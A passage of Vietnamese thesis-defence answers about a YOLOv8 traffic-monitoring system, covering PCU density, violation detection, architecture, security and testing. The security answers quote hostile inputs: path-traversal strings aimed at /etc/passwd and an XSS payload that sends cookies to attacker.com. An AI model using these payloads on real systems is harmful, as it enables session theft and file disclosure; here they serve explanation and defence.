**100.** Có thể kiểm định bằng cách: lấy 4 điểm gốc đã dùng để tính H, áp dụng phép biến đổi thuận rồi biến đổi ngược (inverse), so sánh tọa độ khôi phục được với tọa độ gốc — sai số (reprojection error) càng nhỏ thì ma trận H càng đáng tin cậy; cũng có thể trực quan kiểm tra bằng cách warp cả ảnh và xem lưới ô vuông ảo có đều/thẳng hàng như kỳ vọng trên mặt đường thật không.

---

## G. ƯỚC LƯỢNG MẬT ĐỘ GIAO THÔNG — PCU

**101.** PCU quy đổi các loại phương tiện khác nhau về 1 đơn vị chung tương đương "1 xe con" dựa trên mức độ chiếm dụng không gian mặt đường/ảnh hưởng đến dòng giao thông — là khái niệm chuẩn trong kỹ thuật giao thông (traffic engineering), có trong các tài liệu/hướng dẫn thiết kế giao thông chính thống, không phải tự nghĩ ra.

**102.** Trọng số dựa trên diện tích chiếm dụng mặt đường tương đối: xe máy nhỏ, gọn (0.3 lần xe con), xe con là chuẩn (1.0), xe tải lớn hơn xe con (2.0), xe bus lớn nhất/chiếm nhiều không gian và có tốc độ/khả năng luân chuyển kém hơn (2.5).

**103.** Đây chính là 1 hạn chế thực tế đã được xác nhận qua việc đọc code: các phương tiện thuộc `van, bicycle, container_truck, fire_engine` **không nằm trong `VEHICLE_CLASSES`** nên **hoàn toàn không được tính vào `pcu_total`** dù model vẫn detect và vẽ box cho chúng — cần bổ sung trọng số PCU cho đủ 8 lớp để phản ánh đúng thực tế giao thông.

**103b.** Mật độ báo cáo sẽ **thấp hơn** thực tế — vì các xe tải nặng như `container_truck` (đáng lẽ đóng góp PCU rất lớn, thậm chí lớn hơn cả `truck` thường) hoàn toàn bị bỏ qua trong tổng PCU, khiến `density_percent` bị đánh giá thấp hơn mức độ đông đúc thực sự của giao thông.

**104.** Cần AND cả 2 điều kiện vì: (a) lọc lớp đảm bảo chỉ đếm phương tiện thuộc nhóm được định nghĩa PCU (loại trừ nhiễu/vật thể không liên quan), (b) lọc ROI đảm bảo chỉ đếm xe trong vùng không gian quan tâm (không tính xe ở làn khác/ngoài khu vực giám sát) — thiếu 1 trong 2 sẽ đếm sai phạm vi hoặc sai loại phương tiện.

**105.** `max_capacity` nên dựa trên diện tích thực tế của ROI quy đổi ra số xe con tối đa có thể xếp vừa khít trong không gian đó (ước lượng từ chiều dài × số làn đường / chiều dài trung bình 1 xe con), thay vì đặt cố định 1 con số chung cho mọi nút giao có kích thước khác nhau.

**106.** Chặn ở 100% để tránh hiển thị các giá trị vô lý (ví dụ 150%, 300%) gây khó hiểu cho người xem dashboard khi có sai số đo lường (ví dụ ROI/max_capacity cấu hình chưa chuẩn) — về mặt UX, "Ùn tắc nghiêm trọng (100%)" dễ hiểu hơn "Ùn tắc (243%)".

**107.** Đây là các ngưỡng **heuristic** (kinh nghiệm thực nghiệm/tham khảo từ tài liệu giao thông phổ biến, ví dụ Highway Capacity Manual dùng khái niệm Level of Service tương tự), không phải suy ra trực tiếp từ số liệu thống kê đo đạc thực địa của chính đồ án này — cần nêu rõ điều này khi hội đồng hỏi để tránh bị coi là "khẳng định khoa học tuyệt đối".

**108.** Hệ thống hiện tại **chỉ dừng ở mức khuyến nghị hiển thị dạng text** (`get_recommendation()` trả về chuỗi cố định) — không có kết nối thực tế tới bộ điều khiển đèn tín hiệu vật lý (không có actuator/API điều khiển đèn giao thông thật), đây là điểm quan trọng cần làm rõ nếu bị hỏi "hệ thống có tự động điều khiển đèn không".

**109.** Vì xe máy có động lực học/hành vi giao thông khác biệt lớn so với ô tô (linh hoạt hơn, có thể len lỏi, chiếm ít diện tích hơn nhưng số lượng thường áp đảo ở đô thị VN) — theo dõi riêng tỉ lệ này giúp phân tích đặc thù giao thông "xe máy hóa" của Việt Nam, điều mà các công thức PCU gốc (thường thiết kế cho giao thông phương Tây, chủ yếu ô tô) không phản ánh đầy đủ.

**110.** Nếu chỉ đếm đầu xe không quy đổi PCU, 20 xe máy đi thành cụm sát nhau (chiếm không gian tương đương ~6 xe con thực tế theo PCU) sẽ bị coi "nặng" ngang với 20 xe tải/bus (chiếm không gian gấp nhiều lần) — hoàn toàn không phản ánh đúng mức độ chiếm dụng đường thực tế, dễ đưa ra cảnh báo ùn tắc sai (hoặc bỏ sót ùn tắc thật do xe tải/bus).

**111.** Không đúng hoàn toàn trong thực tế — khi dừng đèn đỏ, xe máy VN thường xếp hàng rất sát nhau (mật độ không gian cao hơn nhiều so với lúc di chuyển với khoảng cách an toàn), trong khi trọng số PCU cố định (0.3) không phân biệt trạng thái "đang di chuyển" hay "đang dừng chờ" — đây là 1 giả định đơn giản hóa của mô hình.

**112.** `density_history` là mật độ theo từng frame tức thời được lưu lại thành chuỗi lịch sử, giới hạn 200 giá trị gần nhất — giới hạn kích thước để tránh bộ nhớ tăng vô hạn theo thời gian chạy (video dài/session lâu), đồng thời việc chỉ giữ 200 giá trị gần nhất phù hợp cho mục đích hiển thị xu hướng gần đây (biểu đồ trend) thay vì lưu trữ vô thời hạn.

**113.** Đây là lỗi hiệu chỉnh hệ thống (calibration error) — sai số không nằm ở thuật toán detect/track mà ở tham số cấu hình đầu vào không khớp với thực tế vật lý của địa điểm triển khai, dẫn tới kết luận sai lệch có hệ thống (systematic bias) dù mọi thành phần AI hoạt động đúng.

**114.** Đề xuất: đo diện tích ROI thực tế qua phép biến đổi Homography (chuyển ROI sang tọa độ thực tế mét vuông), sau đó chia cho diện tích trung bình 1 xe con chiếm dụng (bao gồm khoảng cách an toàn) để tự động suy ra `max_capacity` hợp lý theo từng địa điểm, thay vì đặt cứng bằng tay.

**115.** Việc xe nào "trong ROI" hay không hoàn toàn phụ thuộc vào center_point của nó có nằm trong polygon ROI tại đúng thời điểm đó không — do bounding box có thể dao động nhẹ (jitter) giữa các frame liên tiếp (nhất là ở gần biên ROI), 1 xe đứng gần đúng biên có thể "nhấp nháy" vào/ra khỏi vùng đếm qua từng frame, gây hiện tượng đếm không ổn định (flicker) trong `density_history`.

---

## H. PHÁT HIỆN VI PHẠM

**116.** 2 loại: vượt đèn đỏ (Red Light Violation) và đi sai làn (Wrong Lane Violation). Đi sai làn khó hơn về mặt logic vì phụ thuộc vào việc định nghĩa chính xác ranh giới từng làn (dễ nhầm khi xe đang chuyển làn hợp lệ), trong khi vượt đèn đỏ chỉ cần 1 sự kiện rõ ràng: cắt qua 1 đường thẳng tại đúng thời điểm đèn đỏ.

**117.** Về bản chất code hiện tại thực hiện **so sánh trực tiếp tọa độ y** của center trước/sau với `line_y` (dạng "y trước ở phía nào, y sau ở phía nào") — đây là cách đơn giản hóa của khái niệm "cross product hướng" (nếu tổng quát hóa cho đường bất kỳ không chỉ ngang, người ta thường dùng dấu của tích có hướng giữa vector đường và vector di chuyển) chứ không phải code hiện tại tính tích có hướng (cross product) tường minh — nên trả lời trung thực rằng cách implement thực tế là so sánh trục y đơn giản, đúng bản chất toán học tương đương nhưng không viết literal dưới dạng công thức cross product.

**118.** Nếu vạch nghiêng, việc chỉ dùng 1 giá trị y trung bình sẽ gây sai số cục bộ: ở đầu vạch cao hơn (y nhỏ hơn), xe có thể bị coi "đã cắt vạch" sớm hơn thực tế; ở đầu vạch thấp hơn thì muộn hơn thực tế — sai số lớn nhất khi làn đường rộng và độ nghiêng vạch (do góc camera) lớn.

**119.** Nếu đèn không phải màu đỏ (`traffic_light != "RED"`), điều kiện `check_red_light_violation()` không thỏa nên **không** ghi log — code chỉ coi là vi phạm khi xe cắt vạch VÀ đồng thời đèn đang đỏ tại thời điểm đó.

**120.** Có — vì `logged_red_light_ids` là 1 tập hợp (set) lưu track_id **đã từng** bị ghi log, một khi track_id đó đã được thêm vào set, mọi lần kiểm tra tiếp theo cho cùng track_id sẽ bị chặn ghi log lại (dù center có dao động qua lại quanh line_y nhiều lần) — logic này chống ghi trùng hiệu quả miễn là track_id không bị đổi (xem câu 69 về rủi ro ID switch).

**121.** Ví dụ: 1 xe máy tạm thời lấn sang làn ô tô để né ổ gà/vật cản trên đường rồi quay lại đúng làn ngay sau đó — về hành vi thực tế đây là tình huống bất khả kháng hợp lý, nhưng logic hiện tại (chỉ kiểm tra class có thuộc `allowed` của làn đang đứng hay không tại mỗi frame) sẽ ghi nhận là vi phạm ngay khi center_point rơi vào vùng làn không cho phép, không phân biệt được ý định/thời gian lấn làn.

**122.** Chỉ ghi 1 lần mỗi track_id để tránh việc 1 hành vi vi phạm liên tục (xe đi sai làn suốt nhiều giây/nhiều frame) bị nhân bản thành hàng chục/hàng trăm bản ghi log trùng lặp trong database — về bản chất đây vẫn là "1 lần vi phạm" (1 hành trình đi sai làn), không phải nhiều vi phạm riêng biệt.

**123.** Nhúng `frame_index` và `timestamp` giúp truy vết chính xác **thời điểm cụ thể** vi phạm xảy ra trong video gốc (phục vụ đối chiếu/kiểm tra lại), đồng thời giúp file tự nhiên sắp xếp theo thứ tự thời gian khi liệt kê — UUID ngẫu nhiên tuy tránh trùng tên tốt nhưng không mang thông tin ngữ cảnh nào, khó tra cứu thủ công.

**124.** Kỹ thuật vẽ viền trắng dày rồi chữ đỏ mỏng đè lên (text outline/stroke) đảm bảo chữ vẫn đọc được rõ ràng dù nền ảnh phía sau có màu sắc/độ tương phản bất kỳ (nền đường tối, nền xe sáng...) — nếu chỉ vẽ chữ đỏ đơn thuần, chữ có thể "biến mất" khi nền cũng có tông màu đỏ/tối tương tự.

**125.** Dựa trên nguyên tắc lập trình phòng thủ, hệ thống nên kiểm tra giá trị trả về của `save_crop()` và nếu thất bại thì ít nhất vẫn ghi log vi phạm vào SQLite (có bản ghi dữ liệu) nhưng đánh dấu thiếu ảnh bằng chứng, thay vì để lỗi lưu ảnh làm crash toàn bộ luồng ghi log — đây là điểm cần kiểm tra kỹ trong code thực tế xem có xử lý ngoại lệ (try/except) hợp lý hay không.

**126.** Không — nếu ID switch xảy ra đúng lúc, ảnh bằng chứng có thể gắn nhãn track_id/thời điểm cho đúng SỰ KIỆN cắt vạch nhưng nội dung ảnh (biển số, hình dáng xe) vẫn là ảnh chụp đúng thực tế tại khung hình đó — vấn đề rủi ro pháp lý nằm ở chỗ **nhãn/track_id gắn với chuỗi lịch sử hành trình xe** (ví dụ để tính tốc độ/xác nhận đúng 1 xe từ đầu tới cuối) có thể bị sai nếu dựa vào track_id đã bị hoán đổi, chứ bản thân từng khung ảnh chụp tại đúng khoảnh khắc vẫn đúng.

**127.** Vì OpenCV mặc định lưu/đọc ảnh theo thứ tự kênh **BGR** (Blue-Green-Red), không phải RGB — do đó để ra màu đỏ thuần, giá trị kênh Red (kênh thứ 3, index 2) phải là 255 và 2 kênh đầu (B,G) là 0, tức `(0,0,255)` theo thứ tự BGR.

**128.** Rung camera 1-2 pixel có thể vô tình vượt qua ngưỡng `min_cross_delta_px=2` một cách ngẫu nhiên (không phải do xe di chuyển thật) đúng lúc 1 xe đang đứng yên gần vạch — có thể gây false positive hiếm gặp; đây là lý do ngưỡng 2px không thể set quá nhỏ (ví dụ 0-1px) vì sẽ càng dễ bị nhiễu rung camera kích hoạt sai.

**129.** Vòng lặp `for` tuần tự trên số lượng track có độ phức tạp tuyến tính O(n) theo số xe trong ROI — với vài chục xe vẫn rất nhanh (không đáng kể so với thời gian inference model), nhưng nếu số track tăng lên rất lớn (100+, ví dụ cảnh tắc đường cực độ) vẫn có thể trở thành 1 phần đáng kể trong ngân sách thời gian mỗi frame, nên đây là điểm cần lưu ý khi mở rộng quy mô (scale).

**130.** Ví dụ: **Đỗ xe sai quy định** — dùng track_id + center_point theo dõi 1 xe có `center_point` gần như đứng yên (di chuyển < X pixel) trong hơn N giây liên tục **trong khi nằm trong ROI vùng cấm đỗ** → ghi nhận vi phạm, tái sử dụng gần như nguyên vẹn cơ chế theo dõi track_id + kiểm tra ROI đã có, chỉ thêm điều kiện về thời gian đứng yên thay vì cắt vạch.

---

## I. LƯU TRỮ DỮ LIỆU & KIẾN TRÚC HỆ THỐNG

**131.** SQLite không cần cài đặt/quản trị server riêng (embedded, chỉ là 1 file), phù hợp với quy mô đồ án/demo 1 server duy nhất, đơn giản triển khai. Trade-off: không hỗ trợ tốt truy cập ghi đồng thời ở quy mô lớn (nhiều server/nhiều tiến trình cùng ghi), không có tính năng replication/clustering như PostgreSQL/MySQL — sẽ cần đổi sang DB mạnh hơn nếu triển khai production quy mô lớn nhiều camera.

**132.** Lock bảo vệ khỏi race condition khi nhiều luồng/request cùng ghi vào SQLite đồng thời — SQLite vốn hạn chế về ghi đồng thời (thường chỉ 1 writer tại 1 thời điểm), nếu không có lock ở tầng ứng dụng, 2 thao tác ghi chồng chéo có thể gây lỗi database bị khóa (`database is locked`) hoặc dữ liệu ghi không toàn vẹn.

**133.** Client upload video → Backend lưu file, tạo `ProcessingSession` → Client gọi lặp lại `next-frame` → Backend đọc frame từ VideoCapture, chạy detect+track+density+violation, trả kết quả (bbox, density, vi phạm) dạng JSON/base64 → Frontend vẽ lại lên Canvas/dashboard → Khi hết video/client dừng, session bị dọn dẹp (cleanup).

**134.** Pull-based: client chủ động hỏi "cho tôi frame tiếp theo" từng lần một, server chỉ xử lý khi có yêu cầu — đơn giản implement bằng REST thuần, dễ debug, nhưng có độ trễ do round-trip HTTP mỗi frame. Push/Streaming (WebSocket/SSE): server chủ động đẩy dữ liệu liên tục về client ngay khi có, độ trễ thấp hơn, trải nghiệm mượt hơn nhưng phức tạp hơn về quản lý kết nối lâu dài (persistent connection).

**135.** Vì đơn giản hóa việc implement (REST API thuần, không cần quản lý kết nối 2 chiều phức tạp như WebSocket), dễ kiểm soát tốc độ xử lý theo đúng nhịp client có thể tiêu thụ (client chậm thì tự nhiên gọi chậm lại, tránh tràn buffer), và dễ debug/test hơn bằng công cụ HTTP thông thường (Postman, curl).

**136.** VideoCapture giữ file handle mở và chiếm bộ nhớ/tài nguyên hệ thống liên tục — nếu client "bỏ ngang" không gọi cleanup, tài nguyên đó sẽ bị rò rỉ (leak) cho đến khi cơ chế cleanup tự động theo timeout hoạt động (xem câu 137), gây lãng phí tài nguyên nếu nhiều session bị bỏ dở cùng lúc.

**137.** Đây là dạng garbage collection theo TTL (Time-To-Live) — 1 tiến trình nền định kỳ (mỗi 60s) quét qua tất cả session, session nào không hoạt động (không có request nào) quá 20 phút sẽ tự động bị đóng và giải phóng tài nguyên, tránh phải dựa hoàn toàn vào client gọi cleanup thủ công.

**138.** Vì inference model (YOLOv8 detect+track) là tác vụ rất tốn CPU/GPU — nếu cho phép quá nhiều session đồng thời, mỗi request `next-frame` của mọi session sẽ tranh chấp tài nguyên tính toán, làm giảm FPS xử lý của TẤT CẢ session xuống rất thấp (thậm chí treo server) — giới hạn 3 giúp đảm bảo mỗi session vẫn có đủ tài nguyên để chạy mượt.

**139.** Giảm kích thước ảnh giúp tăng tốc độ inference đáng kể (ít pixel hơn = ít phép tính hơn), nhưng đồng thời làm mất chi tiết của vật thể nhỏ ở xa (xe máy xa camera có thể chỉ còn vài pixel sau khi resize xuống 960px), có thể làm giảm khả năng phát hiện các vật thể này — đánh đổi tốc độ lấy 1 phần độ chính xác cho vật thể nhỏ.

**140.** JPEG nén ảnh mất mát dữ liệu (lossy) nhưng giảm kích thước file/băng thông rất nhiều so với PNG (nén không mất mát) hoặc ảnh gốc thô — với mục đích hiển thị preview trực quan trên dashboard (không cần độ chính xác pixel tuyệt đối), JPEG quality 82 là điểm cân bằng hợp lý giữa chất lượng nhìn thấy được và tốc độ truyền tải qua mạng.

**141.** Có rủi ro — nếu nhiều session cùng gọi `model.track()` đồng thời trên cùng 1 instance model mà không có cơ chế đồng bộ hóa (lock/queue), có thể xảy ra race condition trong trạng thái nội bộ của tracker (ByteTrack lưu trạng thái track theo từng lần gọi `persist=True`), dẫn tới trạng thái tracking bị lẫn lộn giữa các session khác nhau nếu code không xử lý cẩn thận (cần kiểm tra xem mỗi session có giữ instance tracker riêng hay dùng chung).

**142.** Cho phép thay đổi hành vi hệ thống (ngưỡng, PCU weight, ROI mặc định...) mà không cần sửa/build lại code, dễ tinh chỉnh khi triển khai ở địa điểm mới có đặc điểm khác, và tách biệt rõ ràng giữa "logic xử lý" (code) và "tham số cấu hình" (data) — giúp code sạch, dễ bảo trì và test hơn.

**143.** `torch.load` mặc định (trước các bản vá bảo mật gần đây của PyTorch) dùng cơ chế deserialization dựa trên `pickle` — có khả năng thực thi mã tùy ý (arbitrary code execution) nếu file `.pt` chứa payload độc hại được crafted có chủ đích, đây là rủi ro bảo mật thực sự nếu cho phép người dùng bất kỳ tự do upload file model vào hệ thống mà không kiểm soát nguồn gốc/xác thực.

**144.** So với 1 pipeline chạy edge (Jetson Nano/tương tự) trực tiếp trên camera: kiến trúc edge có độ trễ thấp hơn (không cần truyền video qua mạng), giảm băng thông, nhưng phần cứng edge hạn chế hơn (khó chạy model lớn/nhiều camera cùng lúc trên 1 thiết bị). Với triển khai thực tế 1 nút giao, kiến trúc edge phù hợp hơn cho độ trễ thấp và giảm phụ thuộc kết nối mạng liên tục; kiến trúc server tập trung (như hiện tại) phù hợp hơn khi cần tổng hợp dữ liệu từ nhiều camera về 1 nơi để phân tích toàn cảnh.

**145.** Đúng — đây là cùng 1 hạn chế nhất quán xuyên suốt hệ thống: cả `density.py` (PCU) lẫn `class_totals` trong `ProcessingSession` đều chỉ hard-code 4/8 lớp phương tiện, cho thấy khi mở rộng model lên 8 lớp, phần logic nghiệp vụ (business logic) downstream chưa được cập nhật đồng bộ theo — 1 điểm sửa cần làm nhất quán ở nhiều nơi trong code chứ không chỉ 1 chỗ.

---

## J. BẢO MẬT

**146.** Path Traversal là tấn công dùng chuỗi đường dẫn đặc biệt (ví dụ `../../etc/passwd` hoặc `..\..\Windows\System32\config`) để "thoát" ra khỏi thư mục cho phép, đọc/ghi file ở vị trí không được phép trên hệ thống. Ví dụ input độc hại: nếu API nhận `filename=../../../backend/main.py` mà không kiểm tra, kẻ tấn công có thể đọc được mã nguồn/file nhạy cảm ngoài thư mục `evidence/`.

**147.** Kiểm tra `\x00` (null byte injection) chặn 1 kỹ thuật tấn công cũ nơi kẻ tấn công chèn byte null để "cắt ngắn" chuỗi đường dẫn ở tầng hệ điều hành khác với tầng kiểm tra của Python, đánh lừa validation. Kiểm tra `base not in candidate.parents` đảm bảo đường dẫn đã chuẩn hóa tuyệt đối (`.resolve()`) của file đích thực sự nằm bên trong thư mục gốc cho phép — đây là lớp kiểm tra cuối cùng và đáng tin cậy nhất, độc lập với các ký tự `..` có bị ẩn/encode khéo léo trong chuỗi input hay không.

**148.** Vì chuỗi thô có thể chứa các biến thể encode khác nhau của `..` (URL-encoded, dùng dấu `/` hoặc `\` lẫn lộn giữa OS, hoặc symlink) mà kiểm tra string đơn giản dễ bị bỏ sót — `.resolve()` chuẩn hóa toàn bộ đường dẫn (giải quyết `..`, symlink, dấu phân cách) thành 1 đường dẫn tuyệt đối duy nhất và nhất quán, cho phép so sánh chính xác nó có thực sự nằm trong thư mục gốc hay không.

**149.** Đường dẫn tuyệt đối (ví dụ `/etc/passwd` hoặc `C:\Windows\System32\...`) cho phép người dùng trỏ trực tiếp tới **bất kỳ vị trí nào trên toàn hệ thống file**, hoàn toàn bỏ qua ý định giới hạn chỉ trong thư mục `models/` — nếu ứng dụng sau đó load file này bằng `torch.load` (xem câu 143), kẻ tấn công có thể ép server load 1 file pickle độc hại ở bất kỳ đâu.

**150.** Không giới hạn dung lượng upload → kẻ tấn công có thể gửi file khổng lồ (hàng chục/hàng trăm GB) liên tục, làm đầy ổ đĩa server hoặc tiêu tốn toàn bộ băng thông mạng, dẫn tới Denial of Service (DoS) — server không còn tài nguyên phục vụ người dùng hợp lệ khác.

**151.** Không đủ an toàn tuyệt đối — chỉ kiểm tra đuôi file là kiểm tra bề mặt (surface-level), hoàn toàn có thể đổi tên bất kỳ file nào (kể cả file thực thi độc hại) thành đuôi `.mp4` để vượt qua kiểm tra này. Cần kết hợp thêm kiểm tra magic bytes/nội dung file thực tế (file signature) để xác thực đúng là file video thật, không chỉ dựa vào tên file.

**152.** Không — Content-Type do **client tự khai báo** trong HTTP header, hoàn toàn có thể bị giả mạo tùy ý bởi bất kỳ ai gửi request (không cần qua trình duyệt, có thể dùng công cụ như curl/Postman để set header tùy ý) — không nên coi đây là 1 lớp bảo mật đáng tin cậy, chỉ nên dùng như 1 gợi ý sơ bộ, cần validate nội dung thực tế song song.

**153.** XSS: kẻ tấn công chèn mã JavaScript độc hại vào dữ liệu hiển thị trên trang web (ví dụ tên file, tên session do người dùng đặt), nếu không escape, trình duyệt của nạn nhân khác xem trang đó sẽ **thực thi** đoạn mã này. Ví dụ payload: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` — nếu không escape, đoạn này chạy được và có thể đánh cắp cookie/session của người xem dashboard.

**154.** Không — `allow_origins=["*"]` cho phép **bất kỳ domain nào** gọi API này từ trình duyệt (cross-origin request được chấp nhận), trong môi trường production đây là cấu hình quá lỏng lẻo, tiềm ẩn rủi ro nếu API có dữ liệu nhạy cảm hoặc thao tác có side-effect — nên giới hạn `allow_origins` chỉ về đúng domain frontend chính thức của hệ thống.

**155.** Đây là biện pháp phòng chống **Information Disclosure** (rò rỉ thông tin) — nếu để lộ message lỗi gốc (ví dụ stack trace đầy đủ, đường dẫn file nội bộ, tên biến trong code), kẻ tấn công có thể thu thập thông tin quý giá về cấu trúc hệ thống để lên kế hoạch tấn công tiếp theo; `safe_error()` chỉ trả về thông báo lỗi tối giản, an toàn cho client trong khi log chi tiết đầy đủ chỉ được ghi ở phía server.

**156.** Không — `MAX_ACTIVE_SESSIONS=3` chỉ giới hạn theo tổng số session bất kể nguồn gốc, không phân biệt IP — 1 kẻ tấn công vẫn có thể dùng chính 3 "suất" đó để chiếm dụng hoàn toàn tài nguyên, chặn người dùng hợp lệ khác. Cần bổ sung: rate limiting theo IP/API key, CAPTCHA cho upload, hoặc hệ thống hàng đợi (queue) công bằng hơn.

**157.** Dù không thể vượt quá 3 session đồng thời, mỗi session xử lý 1 video "rất dài" vẫn chiếm giữ 1 trong 3 "suất" tài nguyên đó liên tục trong thời gian rất lâu (hoặc tới khi hết timeout 20 phút) — về hiệu quả, đây vẫn là 1 dạng tấn công làm cạn tài nguyên cục bộ (resource exhaustion) dù bị giới hạn timeout phần nào giảm nhẹ mức độ nghiêm trọng.

**158.** Rủi ro SQL injection phụ thuộc vào việc `core/storage.py` có dùng **parameterized query** (câu lệnh SQL có tham số, ví dụ `cursor.execute("INSERT INTO violations VALUES (?, ?)", (val1, val2))`) hay dùng string formatting trực tiếp nối chuỗi SQL (`f"...{user_input}..."`) — cách viết an toàn bắt buộc phải dùng tham số hóa qua driver DB (như ví dụ `?` placeholder ở trên), không bao giờ nối trực tiếp input người dùng vào câu lệnh SQL.

**159.** Có thể còn thiếu: kiểm thử session ID có đủ ngẫu nhiên/khó đoán không (nếu ID dễ đoán, kẻ tấn công có thể "cướp" session của người khác bằng cách đoán ID); kiểm thử race condition khi nhiều request cùng thao tác 1 session; kiểm thử giới hạn tốc độ request (rate limiting) theo từng client cụ thể; kiểm thử injection qua tên file upload (không chỉ path traversal mà cả các ký tự đặc biệt khác).

**160.** Đề xuất: (1) Xác thực người dùng bằng JWT/OAuth để phân quyền truy cập API (chỉ người có thẩm quyền mới xem/thao tác dữ liệu vi phạm), (2) Bắt buộc HTTPS toàn bộ để mã hóa dữ liệu truyền tải (tránh nghe lén ảnh bằng chứng/dữ liệu nhạy cảm), và ghi audit log đầy đủ (ai truy cập gì, khi nào) để phục vụ điều tra nếu có sự cố bảo mật.

---

## K. KIỂM THỬ & KỸ THUẬT PHẦN MỀM

**161.** Unit Test kiểm thử 1 đơn vị code nhỏ, độc lập (1 hàm/1 class) trong môi trường cô lập (thường dùng mock cho các phụ thuộc bên ngoài). Integration Test kiểm thử nhiều thành phần phối hợp với nhau (ví dụ toàn bộ luồng API từ request tới response, có thể chạm vào DB thật). Các test như `test_density.py`/`test_violation.py` thiên về unit test cho logic tính toán; `test_backend_security.py` gần với integration test vì kiểm thử qua tầng API.

**162.** Nhờ **mocking/dependency isolation** — các test không cần model thật (không cần load `.pt`/chạy `ultralytics`) mà giả lập (mock) trực tiếp đầu ra của detection/tracking (ví dụ tự tạo sẵn danh sách track_id, bbox giả) để kiểm thử riêng logic nghiệp vụ (density/violation) — đây là nguyên tắc thiết kế tốt: tách biệt logic thuần túy (dễ test) khỏi phần phụ thuộc nặng/không xác định (model AI).

**163.** Ví dụ: 3 motorcycle (0.3×3=0.9) + 1 car (1.0×1=1.0) + 1 truck (2.0×1=2.0) = tổng PCU = 0.9+1.0+2.0 = **3.9**, mật độ = 3.9/max_capacity×100%. (Lưu ý: con số cụ thể trong test file có thể dùng tổ hợp khác để ra đúng 4.1 — sinh viên nên tự thay số vào công thức PCU và đối chiếu lại với test case thật trong `test_density.py` để chắc chắn khớp 100%.)

**164.** Test Coverage đo tỉ lệ phần trăm dòng lệnh/nhánh logic thực sự được thực thi qua khi chạy toàn bộ test suite. Với 7 file test hiện có, nhiều khả năng coverage tập trung vào các trường hợp "happy path" (đầu vào hợp lệ, luồng chính) — cần xem xét kỹ liệu các nhánh biên (edge case: ROI rỗng, track_id trùng, giá trị âm/vượt ngưỡng) đã có test riêng hay chưa; đây là câu hỏi hội đồng thường dùng để kiểm tra mức độ hiểu sâu về testing thay vì chỉ "có test là đủ".

**165.** Đây là test về **cả hai** — vừa kiểm tra tính đúng đắn chức năng (model đúng được nạp đúng đường dẫn hợp lệ), vừa là test bảo mật (đảm bảo đường dẫn độc hại/tuyệt đối bị chặn) — ranh giới giữa "đúng chức năng" và "an toàn" ở đây gắn liền với nhau vì cùng đi qua 1 hàm validate duy nhất (`resolve_model_path`).

**166.** Cần mock các phương thức: `isOpened()` (giả lập video mở thành công), `read()` (trả về `(True, fake_frame_array)` hoặc `(False, None)` khi hết video), `get(cv2.CAP_PROP_...)` (giả lập FPS/tổng số frame/kích thước), và `release()` — nhờ đó test được toàn bộ logic điều khiển luồng của `ProcessingSession` mà không cần file video thật.

**167.** CI/CD (Continuous Integration/Continuous Deployment) là quy trình tự động build/test/triển khai code mỗi khi có thay đổi được đẩy lên repo. Nếu chưa có GitHub Actions chạy tự động `pytest`, lợi ích khi bổ sung: phát hiện lỗi ngay khi vừa commit (thay vì phải nhớ chạy test thủ công), đảm bảo mọi thay đổi code trong tương lai không làm hỏng chức năng đã có (regression), và tăng độ tin cậy khi làm việc nhóm nhiều người.

**168.** Không pin version khiến 2 máy cài đặt ở 2 thời điểm khác nhau có thể nhận được 2 phiên bản thư viện khác nhau (ví dụ `opencv-python` cập nhật breaking change) — dẫn tới hành vi chương trình có thể khác nhau hoặc lỗi không tái lập được giữa các máy, ảnh hưởng trực tiếp tới khả năng tái lập kết quả nghiên cứu/thực nghiệm mà báo cáo đang cố gắng trình bày chi tiết (hyperparameter, mAP...).

**169.** Git LFS (Large File Storage) lưu trữ con trỏ nhẹ trong lịch sử git thay vì nội dung binary đầy đủ, nội dung file lớn được lưu ở kho riêng và chỉ tải về khi cần — giữ kích thước repo git nhỏ gọn, clone nhanh hơn nhiều. Không nên commit binary lớn trực tiếp vì mỗi lần file đó thay đổi (train lại model), toàn bộ phiên bản cũ vẫn tồn tại vĩnh viễn trong lịch sử git, làm phình to kích thước repo theo cấp số nhân qua thời gian dù chỉ giữ dùng phiên bản mới nhất.

**170.** Trả lời trung thực trước hội đồng: đây là file model còn sót lại từ quá trình thử nghiệm/khám phá (có thể từng thử kiến trúc/phiên bản khác trước khi chốt dùng `vehicle_best.pt` dựa trên YOLOv8), chưa được dọn dẹp khỏi repo trước khi nộp — nên chủ động dọn các file thừa như thế này khỏi repo (hoặc `.gitignore`) trước buổi bảo vệ để tránh câu hỏi/nghi vấn không cần thiết từ hội đồng.

---

## L. GIAO DIỆN & TRIỂN KHAI

**171.** Vanilla JS không cần build step (webpack/babel), không phụ thuộc thêm thư viện ngoài, bundle nhẹ, tải nhanh — phù hợp cho 1 dashboard quy mô vừa phải của đồ án. Trade-off: khi ứng dụng phức tạp hơn (nhiều state, nhiều component tương tác), code Vanilla JS dễ trở nên khó bảo trì hơn so với dùng React/Vue có cơ chế quản lý state/component rõ ràng.

**172.** Canvas API cho phép vẽ đồ họa tùy ý (đường thẳng, đa giác) trực tiếp lên 1 vùng HTML, bắt sự kiện chuột (click/drag) để người dùng tự do vẽ ROI/vạch dừng bằng cách click chọn điểm trên khung hình video hiển thị — sau đó tọa độ các điểm vẽ được gửi về backend làm cấu hình ROI tùy chỉnh.

**173.** Tần suất polling quyết định trực tiếp FPS hiển thị hiệu dụng cho người dùng — nếu frontend gọi `next-frame` 10 lần/giây, người dùng thấy tối đa 10 FPS dù server có xử lý nhanh hơn; ngược lại nếu polling nhanh hơn tốc độ server xử lý được, các request sẽ phải chờ (queue) và FPS thực tế bị giới hạn bởi tốc độ xử lý của server (model inference), không phải bởi tần suất polling.

**174.** Base64 encode làm tăng kích thước dữ liệu truyền tải khoảng 33% so với binary gốc, cộng thêm overhead của JSON — với mạng chậm, độ trễ mỗi lần nhận frame tăng lên đáng kể, có thể làm giật/lag khi xem trực tiếp so với truyền binary thuần hoặc dùng WebSocket streaming tối ưu hơn.

**175.** Cần viết lại/thêm script khởi động dạng shell script (`.sh`) tương đương, kiểm tra lại các đường dẫn file có phân biệt hoa/thường và dùng dấu `/` thay vì `\` (khác biệt hệ điều hành), và cân nhắc dùng process manager phù hợp cho Linux (systemd, supervisor) thay vì cách khởi động thủ công qua batch script.

**176.** Không nên bật `reload=True` trong production — chế độ này khiến server tự động theo dõi thay đổi file và khởi động lại (restart) liên tục, gây tốn tài nguyên giám sát file không cần thiết và có thể gây gián đoạn dịch vụ ngoài ý muốn nếu có file nào đó vô tình bị ghi đè trong lúc server đang chạy thực tế phục vụ người dùng.

